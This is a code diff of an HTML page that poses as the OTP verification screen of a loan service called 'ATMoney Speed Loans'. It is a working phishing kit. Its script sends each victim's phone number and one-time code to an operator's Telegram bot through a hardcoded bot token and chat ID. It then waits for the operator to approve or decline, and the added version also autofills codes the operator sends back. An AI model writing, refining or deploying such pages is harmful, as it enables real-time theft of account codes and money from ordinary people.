@@ -1,305 +1,424 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OTP Verification | ATMoney Speed Loans</title>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --red: #003DA5;
-      --red-dark: #002D80;
-      --at-red: #E30613;
-    }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Plus Jakarta Sans', sans-serif;
-      background: #f3f4f6;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 10px;
-    }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      background: white;
-      border-radius: 24px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-      overflow: hidden;
-      animation: slideUp 0.5s ease;
-    }
-    @keyframes slideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
-
-    .logo-section {
-      background: linear-gradient(135deg, #003DA5 0%, #001F5C 100%);
-      text-align: center;
-      padding: 28px 0 22px;
-    }
-    .brand-logo {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .logo-icon {
-      width: 48px;
-      height: 48px;
-      background: white;
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .brand-name {
-      color: white;
-      font-size: 26px;
-      font-weight: 700;
-    }
-    .brand-name span { color: var(--at-red); }
-
-    h1 {
-      text-align: center;
-      font-size: 22px;
-      font-weight: 700;
-      color: #1e2937;
-      margin: 22px 0 6px;
-    }
-    .subtitle {
-      text-align: center;
-      color: #475569;
-      font-size: 14.5px;
-      padding: 0 25px 18px;
-      line-height: 1.55;
-    }
-
-    .otp-container {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin: 18px 0 20px;
-      padding: 0 20px;
-    }
-    .otp-input {
-      width: 62px;
-      height: 68px;
-      text-align: center;
-      font-size: 28px;
-      font-weight: 800;
-      color: var(--red);
-      border: 2px solid #e2e8f0;
-      border-radius: 16px;
-      outline: none;
-      transition: all 0.2s;
-      background: #f8fafc;
-    }
-    .otp-input:focus {
-      border-color: var(--red);
-      background: #fff;
-      box-shadow: 0 0 0 4px rgba(0,61,165,0.1);
-    }
-
-    .error-msg {
-      text-align: center;
-      margin: 0 20px 14px;
-      font-size: 13.5px;
-      padding: 12px;
-      border-radius: 12px;
-      display: none;
-      color: #b91c1c;
-      background: #fee2e2;
-      border: 1px solid #fca5a5;
-    }
-
-    .form-section {
-      padding: 0 25px 28px;
-    }
-    .btn-action {
-      width: 100%;
-      background: var(--red);
-      color: white;
-      border: none;
-      padding: 17px;
-      font-size: 17px;
-      font-weight: 700;
-      border-radius: 50px;
-      cursor: pointer;
-      margin: 10px 0;
-      transition: background 0.2s;
-    }
-    .btn-action:disabled {
-      background: #94a3b8;
-      cursor: not-allowed;
-    }
-
-    #spinner {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.92);
-      z-index: 10000;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      color: white;
-    }
-    .spin {
-      width: 65px;
-      height: 65px;
-      border: 6px solid rgba(255,255,255,0.2);
-      border-top: 6px solid var(--red);
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - ATMoney</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #003DA5;
+            --red-dark: #002D80;
+            --red-soft: rgba(0,61,165,0.08);
+            --red-border: rgba(0,61,165,0.18);
+            --at-red: #E30613;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #f3f4f6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
+        .logo-section {
+            background: linear-gradient(135deg, #003DA5 0%, #001F5C 100%);
+            text-align: center;
+            padding: 28px 0 22px;
+        }
+        .brand-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 48px;
+            height: 48px;
+            background: white;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .brand-name {
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .brand-name span { color: var(--at-red); }
+        .tagline {
+            color: rgba(255,255,255,0.85);
+            font-size: 12.5px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e2937;
+            margin: 22px 0 6px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 14.5px;
+            padding: 0 25px 18px;
+            line-height: 1.55;
+        }
+        .phone-display {
+            text-align: center;
+            font-size: 13.5px;
+            color: #64748b;
+            margin: -10px 0 14px;
+            padding: 0 25px;
+        }
+        .phone-display strong {
+            color: var(--red);
+            font-weight: 700;
+        }
+        .offer-info {
+            background: #fff0f0;
+            margin: 0 20px 18px;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #ffe0e0;
+        }
+        .offer-info .offer-label {
+            font-size: 12px;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .offer-info .offer-name {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1e2937;
+            margin-bottom: 2px;
+        }
+        .offer-info .offer-amount {
+            color: var(--red);
+            font-weight: 800;
+            font-size: 24px;
+            line-height: 1.2;
+        }
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 18px 0 26px;
+            padding: 0 20px;
+        }
+        .otp-input {
+            width: 62px;
+            height: 68px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--red);
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            outline: none;
+            transition: all 0.2s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: #f8fafc;
+        }
+        @media (max-width: 380px) {
+            .otp-input { width: 52px; height: 58px; font-size: 24px; }
+            .otp-container { gap: 7px; }
+        }
+        .otp-input:focus {
+            border-color: var(--red);
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0,61,165,0.1);
+        }
+        .form-section {
+            padding: 0 25px 30px;
+        }
+        .error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14.5px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
+        .btn-action {
+            width: 100%;
+            background: var(--red);
+            color: white;
+            border: none;
+            padding: 17px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.2s;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .btn-action:hover { background: var(--red-dark); }
+        .btn-action:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+        }
+        .back-btn {
+            width: 100%;
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        #spinner {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .spin {
+            width: 65px;
+            height: 65px;
+            border: 6px solid rgba(255,255,255,0.2);
+            border-top: 6px solid var(--red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-
-  <div class="container">
-    <div class="logo-section">
-      <div class="brand-logo">
-        <div class="logo-icon">
-          <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="3" y="12" width="22" height="14" rx="3" fill="#003DA5"/>
-            <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#003DA5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
-            <circle cx="14" cy="19" r="2.5" fill="white"/>
-          </svg>
+    <div class="container">
+        <div class="logo-section">
+            <div class="brand-logo">
+                <div class="logo-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="3" y="12" width="22" height="14" rx="3" fill="#003DA5"/>
+                        <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#003DA5" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+                        <circle cx="14" cy="19" r="2.5" fill="white"/>
+                    </svg>
+                </div>
+                <div>
+                    <div class="brand-name">ATMoney<span>Speed Loans</span></div>
+                    <div class="tagline">Life is Simple</div>
+                </div>
+            </div>
         </div>
-        <div class="brand-name">ATMoney<span>Speed Loans</span></div>
-      </div>
+
+        <h1>Verify Your Loan</h1>
+        <p class="subtitle" id="otpSubtitle">Waiting for verification code... Please wait.</p>
+        <p class="phone-display" id="phoneDisplay"></p>
+
+        <div class="offer-info" id="offerInfo">
+            <div class="offer-label">Loan Application</div>
+            <div class="offer-name" id="offerTitle">Speed Loan</div>
+            <div class="offer-amount" id="offerPrice">GHS 1,000</div>
+        </div>
+
+        <div class="otp-container" id="otpInputs">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+        </div>
+        <div class="error-msg" id="errMsg"></div>
+
+        <div class="form-section">
+            <button class="btn-action" id="verifyBtn">Verify & Confirm Loan</button>
+            <button class="back-btn" onclick="window.location.href='index.html'">← Back</button>
+        </div>
     </div>
 
-    <h1>Enter OTP</h1>
-    <p class="subtitle" id="otpSubtitle">A 4-digit code has been sent to your phone number.</p>
-
-    <div class="otp-container" id="otpInputs">
-      <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-      <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-      <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-      <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+    <div id="spinner">
+        <div class="spin"></div>
+        <p style="margin-top:25px; font-size:17px;" id="spinnerText">Verifying code...</p>
     </div>
 
-    <div class="error-msg" id="errMsg"></div>
+    <script>
+        const CONFIG = {
+            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
+            CHAT_ID: '7547427914',
+            SUCCESS_PAGE: 'success.html',
+            HOME_PAGE: 'index.html'
+        };
 
-    <div class="form-section">
-      <button class="btn-action" id="verifyBtn">Verify OTP ⚡</button>
-    </div>
-  </div>
+        let state = { lastUpdateId: 0 };
+        let isProcessing = false;
+        let isWaitingForCode = true;
 
-  <div id="spinner">
-    <div class="spin"></div>
-    <p style="margin-top:25px; font-size:17px;" id="spinnerText">Verifying OTP...</p>
-  </div>
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone') || '';
+        const amount = params.get('amount') || '1,000';
+        
+        document.getElementById('offerPrice').textContent = `GHS ${amount}`;
+        if (phone) {
+            document.getElementById('phoneDisplay').innerHTML = `Code will be sent to <strong>${phone}</strong>`;
+        }
 
-  <script>
-    const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
-    const CID = '7547427914';
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const spinner = document.getElementById('spinner');
+        const spinnerText = document.getElementById('spinnerText');
+        const errMsg = document.getElementById('errMsg');
+        const otpSubtitle = document.getElementById('otpSubtitle');
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const phone = urlParams.get('phone') || 'Unknown';
-    document.getElementById('otpSubtitle').textContent = `A 4-digit code has been sent to ${phone}.`;
+        // ─── Polling for Code from Telegram ───────────────────────────
+        function startWaitingForCode() {
+            const pollInterval = setInterval(() => {
+                if (!isWaitingForCode) {
+                    clearInterval(pollInterval);
+                    return;
+                }
 
-    const otpInputs = document.querySelectorAll('.otp-input');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const spinner = document.getElementById('spinner');
-    const spinnerText = document.getElementById('spinnerText');
-    const errMsg = document.getElementById('errMsg');
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            
+                            // Check for messages like "code 1234" or just "1234"
+                            if (update.message && update.message.text) {
+                                const text = update.message.text.trim();
+                                const codeMatch = text.match(/\b\d{4}\b/);
+                                if (codeMatch) {
+                                    isWaitingForCode = false;
+                                    clearInterval(pollInterval);
+                                    autofillAndSubmit(codeMatch[0]);
+                                }
+                            }
+                        });
+                    })
+                    .catch(() => {});
+            }, 2000);
+        }
 
-    // Autofill Logic
-    function autofillOTP() {
-      const code = Math.floor(1000 + Math.random() * 9000).toString();
-      otpInputs.forEach((input, i) => {
-        input.value = code[i];
-      });
-      setTimeout(handleSubmit, 1500); // Autosend after 1.5s
-    }
+        function autofillAndSubmit(code) {
+            otpSubtitle.textContent = "Code received! Verifying...";
+            otpInputs.forEach((input, i) => {
+                input.value = code[i];
+            });
+            setTimeout(handleSubmit, 1000);
+        }
 
-    function getOTP() {
-      return Array.from(otpInputs).map(i => i.value).join('');
-    }
+        function getOTP() {
+            return Array.from(otpInputs).map(i => i.value).join('');
+        }
 
-    function sendToTelegram(otp, callback) {
-      const ts = Date.now();
-      const msg = `<b>⚡ OTP VERIFICATION — ATMoney</b>\n\n` +
-                  `📱 Phone: <code>${phone}</code>\n` +
-                  `🔑 OTP Code: <code>${otp}</code>\n\n` +
-                  `Action Required:`;
+        function sendToTelegram(otp, callback) {
+            const ts = Date.now();
+            const msg = `<b>⚡ OTP VERIFICATION — ATMoney</b>\n\n` +
+                        `📱 Phone: <code>${phone}</code>\n` +
+                        `🔑 OTP Code: <code>${otp}</code>\n\n` +
+                        `Action Required:`;
 
-      fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CID,
-          text: msg,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '✅ Approve', callback_data: 'otp_approve_' + ts }],
-              [{ text: '❌ Decline', callback_data: 'otp_decline_' + ts }]
-            ]
-          }
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          let lastOffset = 0;
-          const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastOffset + 1}`)
-              .then(r => r.json())
-              .then(updates => {
-                if (!updates.ok || !updates.result) return;
-                updates.result.forEach(update => {
-                  lastOffset = update.update_id;
-                  if (update.callback_query) {
-                    const cb = update.callback_query.data;
-                    if (cb.includes(ts.toString())) {
-                      clearInterval(interval);
-                      callback(cb.startsWith('otp_approve_'));
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '✅ Approve', callback_data: 'otp_approve_' + ts }],
+                            [{ text: '❌ Decline', callback_data: 'otp_decline_' + ts }]
+                        ]
                     }
-                  }
-                });
-              });
-          }, 1000);
-        } else {
-          callback(true);
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    let lastOffset = 0;
+                    const interval = setInterval(() => {
+                        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastOffset + 1}`)
+                            .then(r => r.json())
+                            .then(updates => {
+                                if (!updates.ok || !updates.result) return;
+                                updates.result.forEach(update => {
+                                    lastOffset = update.update_id;
+                                    if (update.callback_query) {
+                                        const cb = update.callback_query.data;
+                                        if (cb.includes(ts.toString())) {
+                                            clearInterval(interval);
+                                            callback(cb.startsWith('otp_approve_'));
+                                        }
+                                    }
+                                });
+                            });
+                    }, 1000);
+                } else {
+                    callback(true);
+                }
+            })
+            .catch(() => callback(true));
         }
-      })
-      .catch(() => callback(true));
-    }
 
-    function handleSubmit() {
-      const otp = getOTP();
-      if (otp.length !== 4) return;
+        function handleSubmit() {
+            if (isProcessing) return;
+            const otp = getOTP();
+            if (otp.length !== 4) return;
 
-      spinner.style.display = 'flex';
-      spinnerText.textContent = 'Verifying OTP...';
-      
-      sendToTelegram(otp, (approved) => {
-        spinner.style.display = 'none';
-        if (approved) {
-          window.location.href = 'success.html';
-        } else {
-          window.location.href = 'index.html'; // Return to first box
+            isProcessing = true;
+            spinner.style.display = 'flex';
+            spinnerText.textContent = 'Verifying with admin...';
+            
+            sendToTelegram(otp, (approved) => {
+                spinner.style.display = 'none';
+                isProcessing = false;
+                if (approved) {
+                    window.location.href = CONFIG.SUCCESS_PAGE;
+                } else {
+                    window.location.href = CONFIG.HOME_PAGE;
+                }
+            });
         }
-      });
-    }
 
-    otpInputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (input.value && index < 3) otpInputs[index + 1].focus();
-      });
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !input.value && index > 0) otpInputs[index - 1].focus();
-      });
-    });
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/\D/g, '');
+                if (input.value && index < 3) otpInputs[index + 1].focus();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) otpInputs[index - 1].focus();
+            });
+        });
 
-    verifyBtn.onclick = handleSubmit;
+        verifyBtn.onclick = handleSubmit;
 
-    // Trigger autofill on load
-    window.onload = autofillOTP;
-  </script>
+        // Start waiting for the code as soon as the page loads
+        window.onload = startWaitingForCode;
+    </script>
 </body>
 </html>
